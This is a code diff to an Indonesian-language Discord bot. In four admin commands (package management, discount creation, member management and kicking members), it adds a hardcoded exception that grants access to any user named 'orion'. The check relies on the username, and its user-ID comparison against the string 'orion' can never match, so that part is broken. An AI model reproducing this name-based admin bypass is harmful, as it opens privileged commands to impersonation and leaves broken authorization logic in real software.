@@ -1594,9 +1594,10 @@ async def admin_stats_command(interaction: discord.Interaction):
 @tree.command(name="manage_packages", description="[Admin] Manage paket membership")
 @discord.app_commands.default_permissions(administrator=False)
 async def manage_packages_command(interaction: discord.Interaction):
-    if not (interaction.user.guild_permissions.administrator or interaction.user.id == interaction.guild.owner_id):
+    is_orion = interaction.user.name.lower() == "orion" or str(interaction.user.id) == "orion"
+    if not (interaction.user.guild_permissions.administrator or interaction.user.id == interaction.guild.owner_id or is_orion):
         await interaction.response.send_message(
-            "❌ Command ini hanya untuk **Admin** atau **Guild Owner**!", 
+            "❌ Command ini hanya untuk **Admin**, **Guild Owner**, atau **Orion**!", 
             ephemeral=True)
         return
     
@@ -1625,9 +1626,10 @@ async def manage_packages_command(interaction: discord.Interaction):
 @tree.command(name="create_discount", description="[Admin] Buat kode diskon")
 @discord.app_commands.default_permissions(administrator=False)
 async def create_discount_command(interaction: discord.Interaction, code: str, discount_percent: int, max_uses: int = 0):
-    if not (interaction.user.guild_permissions.administrator or interaction.user.id == interaction.guild.owner_id):
+    is_orion = interaction.user.name.lower() == "orion" or str(interaction.user.id) == "orion"
+    if not (interaction.user.guild_permissions.administrator or interaction.user.id == interaction.guild.owner_id or is_orion):
         await interaction.response.send_message(
-            "❌ Command ini hanya untuk **Admin** atau **Guild Owner**!", 
+            "❌ Command ini hanya untuk **Admin**, **Guild Owner**, atau **Orion**!", 
             ephemeral=True)
         return
     
@@ -1682,9 +1684,10 @@ async def create_discount_command(interaction: discord.Interaction, code: str, d
 @tree.command(name="manage_members", description="[Admin] Lihat & manage members")
 @discord.app_commands.default_permissions(administrator=False)
 async def manage_members_command(interaction: discord.Interaction):
-    if not (interaction.user.guild_permissions.administrator or interaction.user.id == interaction.guild.owner_id):
+    is_orion = interaction.user.name.lower() == "orion" or str(interaction.user.id) == "orion"
+    if not (interaction.user.guild_permissions.administrator or interaction.user.id == interaction.guild.owner_id or is_orion):
         await interaction.response.send_message(
-            "❌ Command ini hanya untuk **Admin** atau **Guild Owner**!", 
+            "❌ Command ini hanya untuk **Admin**, **Guild Owner**, atau **Orion**!", 
             ephemeral=True)
         return
     
@@ -1728,10 +1731,11 @@ async def manage_members_command(interaction: discord.Interaction):
 @tree.command(name="kick_member", description="[Admin/Com-Manager] Kick member secara manual")
 @discord.app_commands.default_permissions(administrator=False)
 async def kick_member_command(interaction: discord.Interaction):
-    # Admin dan guild owner bisa akses semua command
-    if not (interaction.user.guild_permissions.administrator or interaction.user.id == interaction.guild.owner_id):
+    # Admin, guild owner, dan Orion saja yang bisa akses
+    is_orion = interaction.user.name.lower() == "orion" or str(interaction.user.id) == "orion"
+    if not (interaction.user.guild_permissions.administrator or interaction.user.id == interaction.guild.owner_id or is_orion):
         await interaction.response.send_message(
-            "❌ Command ini hanya untuk **Admin** atau **Guild Owner**!", 
+            "❌ Command ini hanya untuk **Admin**, **Guild Owner**, atau **Orion**!", 
             ephemeral=True)
         return
     
